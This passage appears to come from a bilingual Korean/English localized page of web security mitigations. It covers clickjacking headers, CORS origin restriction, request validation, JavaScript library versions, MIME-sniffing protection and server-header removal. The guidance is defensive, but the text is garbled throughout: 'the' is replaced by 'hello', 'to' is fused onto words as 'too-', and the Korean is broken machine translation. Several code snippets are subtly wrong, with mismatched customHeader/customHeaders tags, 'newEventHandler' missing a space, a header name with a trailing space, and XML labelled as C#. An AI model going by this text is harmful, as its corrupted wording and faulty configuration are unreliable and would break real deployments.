| <span data-ttu-id="47493-249">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-249">**References**</span></span>              | <span data-ttu-id="47493-250">[OWASP 클릭재킹 방어 참고 자료](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IEInternals - X-Frame-Options로 클릭재킹 대응](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/)</span><span class="sxs-lookup"><span data-stu-id="47493-250">[OWASP click-jacking Defense Cheat Sheet](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - Combating click-jacking With X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/)</span></span> |
| <span data-ttu-id="47493-251">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-251">**Steps**</span></span> | <p><span data-ttu-id="47493-252">클릭 jacking 라고도 "UI 보상 공격이"는 경우 공격자가 여러 투명 또는 불투명 레이어 tootrick 사용자를 사용 하 여 단추 또는 링크를 클릭 하면으로 tooclick hello 최상위 페이지에 의도 된 될 때 다른 페이지에 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-252">click-jacking, also known as a "UI redress attack", is when an attacker uses multiple transparent or opaque layers tootrick a user into clicking on a button or link on another page when they were intending tooclick on hello top-level page.</span></span></p><p><span data-ttu-id="47493-253">이렇게이 계층화 hello 희생자의 페이지 로드 iframe 있는 악의적인 페이지를 만들어 이루어집니다.</span><span class="sxs-lookup"><span data-stu-id="47493-253">This layering is achieved by crafting a malicious page with an iframe, which loads hello victim's page.</span></span> <span data-ttu-id="47493-254">따라서 hello 공격자가 "하이재킹"가 해당 페이지를 위해 제공 하 고 라우팅하고 tooanother 페이지, 대개 다른 응용 프로그램, 도메인 또는 둘 다가 소유 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-254">Thus, hello attacker is "hijacking" clicks meant for their page and routing them tooanother page, most likely owned by another application, domain, or both.</span></span> <span data-ttu-id="47493-255">tooprevent 클릭 jacking 디렉터리 집합 hello 적절 한 X-프레임-옵션 HTTP 응답 헤더 hello 브라우저 toonot 지시 하는 다른 도메인의 프레이밍을 사용 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-255">tooprevent click-jacking attacks, set hello proper X-Frame-Options HTTP response headers that instruct hello browser toonot allow framing from other domains</span></span></p>|

### <a name="example"></a><span data-ttu-id="47493-256">예제</span><span class="sxs-lookup"><span data-stu-id="47493-256">Example</span></span>
<span data-ttu-id="47493-257">IIS web.config 통해 hello X-프레임-옵션 헤더를 설정할 수 있습니다. 절대로 프레이밍하지 않아야 하는 사이트에 대한 web.config 코드 조각은 다음과 같습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-257">hello X-FRAME-OPTIONS header can be set via IIS web.config. Web.config code snippet for sites that should never be framed:</span></span> 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a><span data-ttu-id="47493-258">예제</span><span class="sxs-lookup"><span data-stu-id="47493-258">Example</span></span>
<span data-ttu-id="47493-259">통해만 구성 해야 하는 사이트에 대 한 Web.config 코드 페이지에 hello 동일 도메인:</span><span class="sxs-lookup"><span data-stu-id="47493-259">Web.config code for sites that should only be framed by pages in hello same domain:</span></span> 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <span data-ttu-id="47493-260"><a id="cors-aspnet"></a>ASP.NET 웹 응용 프로그램에서 CORS를 사용하도록 설정하는 경우 신뢰할 수 있는 원본만 허용되는지 확인</span><span class="sxs-lookup"><span data-stu-id="47493-260"><a id="cors-aspnet"></a>Ensure that only trusted origins are allowed if CORS is enabled on ASP.NET Web Applications</span></span>

| <span data-ttu-id="47493-261">제목</span><span class="sxs-lookup"><span data-stu-id="47493-261">Title</span></span>                   | <span data-ttu-id="47493-262">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-262">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-263">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-263">**Component**</span></span>               | <span data-ttu-id="47493-264">웹 응용 프로그램</span><span class="sxs-lookup"><span data-stu-id="47493-264">Web Application</span></span> | 
| <span data-ttu-id="47493-265">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-265">**SDL Phase**</span></span>               | <span data-ttu-id="47493-266">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-266">Build</span></span> |  
| <span data-ttu-id="47493-267">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-267">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-268">웹 양식, MVC5</span><span class="sxs-lookup"><span data-stu-id="47493-268">Web Forms, MVC5</span></span> |
| <span data-ttu-id="47493-269">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-269">**Attributes**</span></span>              | <span data-ttu-id="47493-270">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-270">N/A</span></span>  |
| <span data-ttu-id="47493-271">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-271">**References**</span></span>              | <span data-ttu-id="47493-272">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-272">N/A</span></span>  |
| <span data-ttu-id="47493-273">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-273">**Steps**</span></span> | <p><span data-ttu-id="47493-274">브라우저 보안 AJAX 요청 tooanother 도메인에서 웹 페이지를 방지 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-274">Browser security prevents a web page from making AJAX requests tooanother domain.</span></span> <span data-ttu-id="47493-275">이 제한은 hello 동일 원본 정책 이라고 하 고 다른 사이트에서 중요 한 데이터를 읽는 악성 사이트를 방지 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-275">This restriction is called hello same-origin policy, and prevents a malicious site from reading sensitive data from another site.</span></span> <span data-ttu-id="47493-276">그러나 경우에 따라 수 수 필요한 tooexpose Api 안전 하 게 소비할 수 있는 다른 사이트입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-276">However, sometimes it might be required tooexpose APIs securely which other sites can consume.</span></span> <span data-ttu-id="47493-277">교차 원본 리소스 공유 (CORS)는 toorelax hello 동일 원본 정책 서버에 있도록 W3C 표준입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-277">Cross Origin Resource Sharing (CORS) is a W3C standard that allows a server toorelax hello same-origin policy.</span></span> <span data-ttu-id="47493-278">CORS를 사용하면 서버에서 명시적으로 일부 원본 간 요청을 허용하는 한편 다른 요청은 거부할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-278">Using CORS, a server can explicitly allow some cross-origin requests while rejecting others.</span></span></p><p><span data-ttu-id="47493-279">CORS는 JSONP와 같은 이전 기술보다 더 안전하고 유연합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-279">CORS is safer and more flexible than earlier techniques such as JSONP.</span></span> <span data-ttu-id="47493-280">본질적으로 CORS 사용 변환 tooadding 몇 가지 HTTP 응답 헤더 (액세스 제어-*)는 여러 가지 방법으로 toohello 웹 응용 프로그램 및이 수행할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-280">At its core, enabling CORS translates tooadding a few HTTP response headers (Access-Control-*) toohello web application and this can be done in a couple of ways.</span></span></p>|

### <a name="example"></a><span data-ttu-id="47493-281">예제</span><span class="sxs-lookup"><span data-stu-id="47493-281">Example</span></span>
<span data-ttu-id="47493-282">액세스 tooWeb.config를 사용할 수 있는 경우 코드 다음 hello를 통해 CORS는 추가할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-282">If access tooWeb.config is available, then CORS can be added through hello following code:</span></span> 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a><span data-ttu-id="47493-283">예제</span><span class="sxs-lookup"><span data-stu-id="47493-283">Example</span></span>
<span data-ttu-id="47493-284">액세스 tooweb.config 사용할 수 없는 경우 hello CSharp 코드 뒤에 추가 하 여 CORS는 구성할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-284">If access tooweb.config is not available, then CORS can be configured by adding hello following CSharp code:</span></span> 
```C#
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

<span data-ttu-id="47493-285">"액세스 제어-허용-원본" 특성에 대 한 원본 목록 hello 중요 tooensure는 설정 되어 하십시오 원본 tooa 유한 및 신뢰할 수 있는 집합입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-285">Please note that it is critical tooensure that hello list of origins in "Access-Control-Allow-Origin" attribute is set tooa finite and trusted set of origins.</span></span> <span data-ttu-id="47493-286">이 부적절 하 게 tooconfigure 실패 (예: hello 값으로 설정 ' *')을 사용 하면 교차 원본 요청 악성 사이트 tootrigger toohello 웹 응용 프로그램 > 아무런 제한 없이 받으므로 hello 응용 프로그램 취약 tooCSRF 공격입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-286">Failing tooconfigure this inappropriately (e.g., setting hello value as '*') will allow malicious sites tootrigger cross origin requests toohello web application >without any restrictions, thereby making hello application vulnerable tooCSRF attacks.</span></span> 

## <span data-ttu-id="47493-287"><a id="validate-aspnet"></a>ASP.NET 페이지에서 ValidateRequest 특성을 사용하도록 설정</span><span class="sxs-lookup"><span data-stu-id="47493-287"><a id="validate-aspnet"></a>Enable ValidateRequest attribute on ASP.NET Pages</span></span>

| <span data-ttu-id="47493-288">제목</span><span class="sxs-lookup"><span data-stu-id="47493-288">Title</span></span>                   | <span data-ttu-id="47493-289">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-289">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-290">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-290">**Component**</span></span>               | <span data-ttu-id="47493-291">웹 응용 프로그램</span><span class="sxs-lookup"><span data-stu-id="47493-291">Web Application</span></span> | 
| <span data-ttu-id="47493-292">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-292">**SDL Phase**</span></span>               | <span data-ttu-id="47493-293">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-293">Build</span></span> |  
| <span data-ttu-id="47493-294">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-294">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-295">웹 양식, MVC5</span><span class="sxs-lookup"><span data-stu-id="47493-295">Web Forms, MVC5</span></span> |
| <span data-ttu-id="47493-296">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-296">**Attributes**</span></span>              | <span data-ttu-id="47493-297">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-297">N/A</span></span>  |
| <span data-ttu-id="47493-298">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-298">**References**</span></span>              | [<span data-ttu-id="47493-299">요청 유효성 검사 - 스크립트 공격 방지</span><span class="sxs-lookup"><span data-stu-id="47493-299">Request Validation - Preventing Script Attacks</span></span>](http://www.asp.net/whitepapers/request-validation) |
| <span data-ttu-id="47493-300">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-300">**Steps**</span></span> | <p><span data-ttu-id="47493-301">요청 유효성 검사, ASP.NET의 버전 1.1에서 이후 기능을 포함 하는 콘텐츠 인코딩되지 않은 HTML 수락 hello 서버를 방지 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-301">Request validation, a feature of ASP.NET since version 1.1, prevents hello server from accepting content containing un-encoded HTML.</span></span> <span data-ttu-id="47493-302">이 기능은 toohelp 클라이언트 스크립트 코드 또는 HTML을 저장 하 고 제공 tooother 사용자 자신도 모르는 사이 제출 된 tooa 서버 수 그에 따라 일부 스크립트 삽입 공격을 방지 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-302">This feature is designed toohelp prevent some script-injection attacks whereby client script code or HTML can be unknowingly submitted tooa server, stored, and then presented tooother users.</span></span> <span data-ttu-id="47493-303">모든 입력 데이터의 유효성을 검사하고 적절한 경우 HTML로 인코딩하는 것이 좋습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-303">We still strongly recommend that you validate all input data and HTML encode it when appropriate.</span></span></p><p><span data-ttu-id="47493-304">요청 유효성 검사는 잠재적으로 위험한 값의 모든 입력된 데이터 tooa 목록을 비교 하 여 수행 됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-304">Request validation is performed by comparing all input data tooa list of potentially dangerous values.</span></span> <span data-ttu-id="47493-305">일치하는 경우 ASP.NET에서 `HttpRequestValidationException`을 발생시킵니다.</span><span class="sxs-lookup"><span data-stu-id="47493-305">If a match occurs, ASP.NET raises an `HttpRequestValidationException`.</span></span> <span data-ttu-id="47493-306">요청 유효성 검사 기능은 기본적으로 사용하도록 설정됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-306">By default, Request Validation feature is enabled.</span></span></p>|

### <a name="example"></a><span data-ttu-id="47493-307">예제</span><span class="sxs-lookup"><span data-stu-id="47493-307">Example</span></span>
<span data-ttu-id="47493-308">그러나 이 기능은 다음과 같이 페이지 수준에서 사용하지 않도록 설정할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-308">However, this feature can be disabled at page level:</span></span> 
```XML
<%@ Page validateRequest="false" %> 
```
<span data-ttu-id="47493-309">또는 다음과 같이 응용 프로그램 수준에서 사용하지 않도록 설정할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-309">or, at application level</span></span> 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
<span data-ttu-id="47493-310">요청 유효성 검사 기능은 지원되지 않으며 MVC6 파이프라인의 일부가 아닙니다.</span><span class="sxs-lookup"><span data-stu-id="47493-310">Please note that Request Validation feature is not supported, and is not part of MVC6 pipeline.</span></span> 

## <span data-ttu-id="47493-311"><a id="local-js"></a>로컬로 호스팅되는 최신 버전의 JavaScript 라이브러리 사용</span><span class="sxs-lookup"><span data-stu-id="47493-311"><a id="local-js"></a>Use locally-hosted latest versions of JavaScript libraries</span></span>

| <span data-ttu-id="47493-312">제목</span><span class="sxs-lookup"><span data-stu-id="47493-312">Title</span></span>                   | <span data-ttu-id="47493-313">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-313">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-314">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-314">**Component**</span></span>               | <span data-ttu-id="47493-315">웹 응용 프로그램</span><span class="sxs-lookup"><span data-stu-id="47493-315">Web Application</span></span> | 
| <span data-ttu-id="47493-316">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-316">**SDL Phase**</span></span>               | <span data-ttu-id="47493-317">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-317">Build</span></span> |  
| <span data-ttu-id="47493-318">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-318">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-319">일반</span><span class="sxs-lookup"><span data-stu-id="47493-319">Generic</span></span> |
| <span data-ttu-id="47493-320">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-320">**Attributes**</span></span>              | <span data-ttu-id="47493-321">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-321">N/A</span></span>  |
| <span data-ttu-id="47493-322">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-322">**References**</span></span>              | <span data-ttu-id="47493-323">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-323">N/A</span></span>  |
| <span data-ttu-id="47493-324">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-324">**Steps**</span></span> | <p><span data-ttu-id="47493-325">JQuery와 같은 표준 JavaScript 라이브러리를 사용하는 개발자는 알려진 보안 결함이 없는 일반적인 JavaScript 라이브러리의 승인된 버전을 사용해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-325">Developers using standard JavaScript libraries like JQuery must use approved versions of common JavaScript libraries that do not contain known security flaws.</span></span> <span data-ttu-id="47493-326">이전 버전의 알려진된 취약 한 부분에 대 한 보안 수정이 포함 되어 있으므로 toouse hello 가장 최신 버전의 hello 라이브러리를가 하는 것이 좋습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-326">A good practice is toouse hello most latest version of hello libraries, since they contain security fixes for known vulnerabilities in their older versions.</span></span></p><p><span data-ttu-id="47493-327">Hello 최신 릴리스를 toocompatibility 이유로 인해 사용할 수 없는 경우 최소 버전 아래 hello는 사용 해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-327">If hello most recent release cannot be used due toocompatibility reasons, hello below minimum versions should be used.</span></span></p><p><span data-ttu-id="47493-328">허용 가능한 최소 버전:</span><span class="sxs-lookup"><span data-stu-id="47493-328">Acceptable minimum versions:</span></span></p><ul><li><span data-ttu-id="47493-329">**JQuery**</span><span class="sxs-lookup"><span data-stu-id="47493-329">**JQuery**</span></span><ul><li><span data-ttu-id="47493-330">JQuery 1.7.1</span><span class="sxs-lookup"><span data-stu-id="47493-330">JQuery 1.7.1</span></span></li><li><span data-ttu-id="47493-331">JQueryUI 1.10.0</span><span class="sxs-lookup"><span data-stu-id="47493-331">JQueryUI 1.10.0</span></span></li><li><span data-ttu-id="47493-332">JQuery Validate 1.9</span><span class="sxs-lookup"><span data-stu-id="47493-332">JQuery Validate 1.9</span></span></li><li><span data-ttu-id="47493-333">JQuery Mobile 1.0.1</span><span class="sxs-lookup"><span data-stu-id="47493-333">JQuery Mobile 1.0.1</span></span></li><li><span data-ttu-id="47493-334">JQuery Cycle 2.99</span><span class="sxs-lookup"><span data-stu-id="47493-334">JQuery Cycle 2.99</span></span></li><li><span data-ttu-id="47493-335">JQuery DataTables 1.9.0</span><span class="sxs-lookup"><span data-stu-id="47493-335">JQuery DataTables 1.9.0</span></span></li></ul></li><li><span data-ttu-id="47493-336">**Ajax Control Toolkit**</span><span class="sxs-lookup"><span data-stu-id="47493-336">**Ajax Control Toolkit**</span></span><ul><li><span data-ttu-id="47493-337">Ajax Control Toolkit 40412</span><span class="sxs-lookup"><span data-stu-id="47493-337">Ajax Control Toolkit 40412</span></span></li></ul></li><li><span data-ttu-id="47493-338">**ASP.NET Web Forms and Ajax**</span><span class="sxs-lookup"><span data-stu-id="47493-338">**ASP.NET Web Forms and Ajax**</span></span><ul><li><span data-ttu-id="47493-339">ASP.NET Web Forms and Ajax 4</span><span class="sxs-lookup"><span data-stu-id="47493-339">ASP.NET Web Forms and Ajax 4</span></span></li><li><span data-ttu-id="47493-340">ASP.NET Ajax 3.5</span><span class="sxs-lookup"><span data-stu-id="47493-340">ASP.NET Ajax 3.5</span></span></li></ul></li><li><span data-ttu-id="47493-341">**ASP.NET MVC**</span><span class="sxs-lookup"><span data-stu-id="47493-341">**ASP.NET MVC**</span></span><ul><li><span data-ttu-id="47493-342">ASP.NET MVC 3.0</span><span class="sxs-lookup"><span data-stu-id="47493-342">ASP.NET MVC 3.0</span></span></li></ul></li></ul><p><span data-ttu-id="47493-343">공용 CDN과 같이 외부 사이트의 JavaScript 라이브러리를 로드하면 안됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-343">Never load any JavaScript library from external sites such as public CDNs</span></span></p>|

## <span data-ttu-id="47493-344"><a id="mime-sniff"></a>자동 MIME 스니핑을 사용하지 않도록 설정</span><span class="sxs-lookup"><span data-stu-id="47493-344"><a id="mime-sniff"></a>Disable automatic MIME sniffing</span></span>

| <span data-ttu-id="47493-345">제목</span><span class="sxs-lookup"><span data-stu-id="47493-345">Title</span></span>                   | <span data-ttu-id="47493-346">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-346">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-347">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-347">**Component**</span></span>               | <span data-ttu-id="47493-348">웹 응용 프로그램</span><span class="sxs-lookup"><span data-stu-id="47493-348">Web Application</span></span> | 
| <span data-ttu-id="47493-349">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-349">**SDL Phase**</span></span>               | <span data-ttu-id="47493-350">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-350">Build</span></span> |  
| <span data-ttu-id="47493-351">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-351">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-352">일반</span><span class="sxs-lookup"><span data-stu-id="47493-352">Generic</span></span> |
| <span data-ttu-id="47493-353">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-353">**Attributes**</span></span>              | <span data-ttu-id="47493-354">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-354">N/A</span></span>  |
| <span data-ttu-id="47493-355">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-355">**References**</span></span>              | <span data-ttu-id="47493-356">[IE8 보안 5부: 포괄적 보호](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx)(영문), [MIME 형식](http://en.wikipedia.org/wiki/Mime_type)(영문)</span><span class="sxs-lookup"><span data-stu-id="47493-356">[IE8 Security Part V: Comprehensive Protection](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME type](http://en.wikipedia.org/wiki/Mime_type)</span></span> |
| <span data-ttu-id="47493-357">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-357">**Steps**</span></span> | <span data-ttu-id="47493-358">X-콘텐츠-유형-옵션 hello 헤더는 개발자가 사용할 수 있는 HTTP 헤더는 해당 콘텐츠 되지 않아야 MIME 스니핑 toospecify 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-358">hello X-Content-Type-Options header is an HTTP header that allows developers toospecify that their content should not be MIME-sniffed.</span></span> <span data-ttu-id="47493-359">이 헤더는 디자인 된 toomitigate MIME 스니핑 공격입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-359">This header is designed toomitigate MIME-Sniffing attacks.</span></span> <span data-ttu-id="47493-360">사용자가 제어할 수 있는 콘텐츠를 포함할 수 있는 각 페이지에 대 한 HTTP 헤더 X hello를 사용 해야-콘텐츠-유형-옵션: nosniff 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-360">For each page that could contain user controllable content, you must use hello HTTP Header X-Content-Type-Options:nosniff.</span></span> <span data-ttu-id="47493-361">hello 응용 프로그램의 모든 페이지에 대 한 전역적으로 tooenable hello의 필수 헤더를 할 수 있는 hello 다음 중 하나</span><span class="sxs-lookup"><span data-stu-id="47493-361">tooenable hello required header globally for all pages in hello application, you can do one of hello following</span></span>|

### <a name="example"></a><span data-ttu-id="47493-362">예제</span><span class="sxs-lookup"><span data-stu-id="47493-362">Example</span></span>
<span data-ttu-id="47493-363">Hello 응용 프로그램에서 인터넷 정보 서비스 (IIS) 7부터 호스팅되는 경우 hello 헤더 hello web.config 파일에 추가 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-363">Add hello header in hello web.config file if hello application is hosted by Internet Information Services (IIS) 7 onwards.</span></span> 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a><span data-ttu-id="47493-364">예제</span><span class="sxs-lookup"><span data-stu-id="47493-364">Example</span></span>
<span data-ttu-id="47493-365">Hello 통해 hello 헤더 추가 전역 응용 프로그램\_BeginRequest</span><span class="sxs-lookup"><span data-stu-id="47493-365">Add hello header through hello global Application\_BeginRequest</span></span> 
```C#
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a><span data-ttu-id="47493-366">예제</span><span class="sxs-lookup"><span data-stu-id="47493-366">Example</span></span>
<span data-ttu-id="47493-367">사용자 지정 HTTP 모듈을 구현합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-367">Implement custom HTTP module</span></span> 
```C#
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a><span data-ttu-id="47493-368">예제</span><span class="sxs-lookup"><span data-stu-id="47493-368">Example</span></span>
<span data-ttu-id="47493-369">Tooindividual 응답을 추가 하 여 특정 페이지에 대해서만 hello 필수 헤더를 설정할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-369">You can enable hello required header only for specific pages by adding it tooindividual responses:</span></span> 

```C#
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <span data-ttu-id="47493-370"><a id="standard-finger"></a>Windows Azure 웹 사이트 tooavoid 지문에 표준 서버 헤더를 제거 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-370"><a id="standard-finger"></a>Remove standard server headers on Windows Azure Web Sites tooavoid fingerprinting</span></span>

| <span data-ttu-id="47493-371">제목</span><span class="sxs-lookup"><span data-stu-id="47493-371">Title</span></span>                   | <span data-ttu-id="47493-372">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-372">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-373">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-373">**Component**</span></span>               | <span data-ttu-id="47493-374">웹 응용 프로그램</span><span class="sxs-lookup"><span data-stu-id="47493-374">Web Application</span></span> | 
| <span data-ttu-id="47493-375">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-375">**SDL Phase**</span></span>               | <span data-ttu-id="47493-376">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-376">Build</span></span> |  
| <span data-ttu-id="47493-377">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-377">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-378">일반</span><span class="sxs-lookup"><span data-stu-id="47493-378">Generic</span></span> |
| <span data-ttu-id="47493-379">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-379">**Attributes**</span></span>              | <span data-ttu-id="47493-380">EnvironmentType - Azure</span><span class="sxs-lookup"><span data-stu-id="47493-380">EnvironmentType - Azure</span></span> |
| <span data-ttu-id="47493-381">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-381">**References**</span></span>              | <span data-ttu-id="47493-382">[Microsoft Azure 웹 사이트에서 표준 서버 헤더 제거](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/)(영문)</span><span class="sxs-lookup"><span data-stu-id="47493-382">[Removing standard server headers on Windows Azure Web Sites](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/)</span></span> |
| <span data-ttu-id="47493-383">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-383">**Steps**</span></span> | <span data-ttu-id="47493-384">X 전원이-By, 서버와 같은 헤더 X AspNet 버전 한 hello 서버와 기본 기술을 hello에 대 한 정보를 제공 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-384">Headers such as Server, X-Powered-By, X-AspNet-Version reveal information about hello server and hello underlying technologies.</span></span> <span data-ttu-id="47493-385">Toosuppress 좋습니다 지문 하는 것을 막을 수는 이러한 헤더가 hello 응용 프로그램</span><span class="sxs-lookup"><span data-stu-id="47493-385">It is recommended toosuppress these headers thereby preventing fingerprinting hello application</span></span> |

## <span data-ttu-id="47493-386"><a id="firewall-db"></a>데이터베이스 엔진 액세스를 위한 Windows 방화벽 구성</span><span class="sxs-lookup"><span data-stu-id="47493-386"><a id="firewall-db"></a>Configure a Windows Firewall for Database Engine Access</span></span>

| <span data-ttu-id="47493-387">제목</span><span class="sxs-lookup"><span data-stu-id="47493-387">Title</span></span>                   | <span data-ttu-id="47493-388">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-388">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-389">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-389">**Component**</span></span>               | <span data-ttu-id="47493-390">데이터베이스</span><span class="sxs-lookup"><span data-stu-id="47493-390">Database</span></span> | 
| <span data-ttu-id="47493-391">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-391">**SDL Phase**</span></span>               | <span data-ttu-id="47493-392">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-392">Build</span></span> |  
| <span data-ttu-id="47493-393">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-393">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-394">SQL Azure, 온-프레미스</span><span class="sxs-lookup"><span data-stu-id="47493-394">SQL Azure, OnPrem</span></span> |
| <span data-ttu-id="47493-395">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-395">**Attributes**</span></span>              | <span data-ttu-id="47493-396">N/A, SQL 버전 - V12</span><span class="sxs-lookup"><span data-stu-id="47493-396">N/A, SQL Version - V12</span></span> |
